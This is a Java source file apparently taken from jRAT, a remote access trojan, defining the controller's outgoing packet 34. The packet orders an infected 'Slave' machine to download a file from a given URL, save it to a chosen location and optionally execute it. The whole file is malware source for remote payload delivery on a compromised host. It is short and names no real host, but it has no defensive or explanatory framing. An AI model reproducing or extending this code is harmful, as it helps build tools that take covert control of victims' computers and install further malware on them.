package jrat.controller.packets.outgoing;

import jrat.controller.Slave;

import java.io.DataOutputStream;


public class Packet34AdvancedDownload extends AbstractOutgoingPacket {

	private String url;
	private boolean execute;
	private int location;

	public Packet34AdvancedDownload(String url, boolean execute, int location) {
		this.url = url;
		this.execute = execute;
		this.location = location;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(url);
		dos.writeBoolean(execute);
		dos.writeInt(location);
	}

	@Override
	public short getPacketId() {
		return 34;
	}

}
